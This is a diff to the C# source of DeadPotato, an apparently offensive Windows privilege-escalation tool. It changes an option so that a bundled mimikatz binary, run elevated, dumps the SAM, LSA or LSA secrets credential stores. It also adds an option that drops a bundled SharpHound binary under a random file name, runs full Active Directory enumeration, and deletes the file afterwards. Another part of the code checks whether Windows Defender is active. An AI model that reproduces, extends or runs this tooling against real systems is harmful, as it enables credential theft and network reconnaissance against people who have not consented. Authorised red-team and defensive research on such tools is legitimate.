@@ -14,6 +14,7 @@ using System.Reflection;
 using System.Linq;
 using System.Diagnostics;
 using Microsoft.Win32;
+using System.Threading;
 
 namespace DeadPotato
 {
@@ -21,6 +22,7 @@ namespace DeadPotato
     {
         public static bool verbose;
         public static bool isInShell;
+        public static string version = "1.2";
 
         static void Main(string[] args)
         {   
@@ -170,11 +172,11 @@ namespace DeadPotato
                         break;
 
                     
-                    case "-mimisam":
+                    case "-mimi":
 
-                        if (args.Length != 1)
+                        if (args.Length != 2 || (args[1] != "sam" && args[1] != "lsa" && args[1] != "secrets"))
                         {
-                            UI.printColor($"(<darkred>-</darkred>) This command takes no arguments.\nUsage: <yellow>deadpotato.exe -mimisam</yellow>");
+                            UI.printColor($"(<darkred>-</darkred>) This command takes one of these three arguments: <yellow>sam</yellow>, <yellow>lsa</yellow> or <yellow>secrets</yellow> \nUsage: <yellow>deadpotato.exe -mimi sam</yellow>");
                             Environment.Exit(0);
                         }
 
@@ -187,7 +189,7 @@ namespace DeadPotato
                         {
                             File.WriteAllBytes(fileName, Properties.Resources.mimikatz);
                             UI.printColor($"\n(<darkgreen>+</darkgreen>) File written. Attempting to dump SAM...\n\n");
-                            elevateCommand($"{fileName} privilege::debug \"lsadump::sam\" exit", false);
+                            elevateCommand($"{fileName} privilege::debug \"lsadump::{args[1]}\" exit", false);
                             UI.printColor($"\n(<darkgreen>+</darkgreen>) Removing mimikatz and exiting.");
                             File.Delete(fileName);
                         }
@@ -238,6 +240,37 @@ namespace DeadPotato
                         UI.printColor($"(<darkred>*</darkred>) Running status checks...");
                         UI.printColor($"\n(<darkred>*</darkred>) Windows Defender seems to be {(isWindowsDefenderRunning() ? "<darkgreen>ENABLED</darkgreen>" : "<darkred>DISABLED</darkred>")}. Exiting.\n");
                         Environment.Exit(0);
+                        break;
+
+
+                    case "-sharphound":
+
+                        if (args.Length != 1)
+                        {
+                            UI.printColor($"(<darkred>-</darkred>) This command takes no arguments.\nUsage: <yellow>deadpotato.exe -sharphound</yellow>");
+                            Environment.Exit(0);
+                        }
+
+                        UI.printBanner();
+
+                        string fileName2 = new string(Enumerable.Range(0, 8).Select(_ => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[new Random(Guid.NewGuid().GetHashCode()).Next(62)]).ToArray()) + ".exe";
+                        UI.printColor($"(<darkred>*</darkred>) Attempting to write <darkgray>{fileName2}</darkgray> (SharpHound) in the current directory...");
+
+                        try
+                        {
+                            File.WriteAllBytes(fileName2, Properties.Resources.SharpHound);
+                            UI.printColor($"\n(<darkgreen>+</darkgreen>) File written. Attempting to run enumeration...\n\n");
+                            elevateCommand($"{fileName2} -c All", false);
+                            UI.printColor($"\n(<darkgreen>+</darkgreen>) Removing SharpHound and exiting.");
+                            Thread.Sleep(1000);
+                            File.Delete(fileName2);
+                        }
+                        catch
+                        {
+                            UI.printColor($"\n(<darkred>-</darkred>) An error occurred. Exiting.");
+                            Environment.Exit(0);
+                        }
+
                         break;
 
 
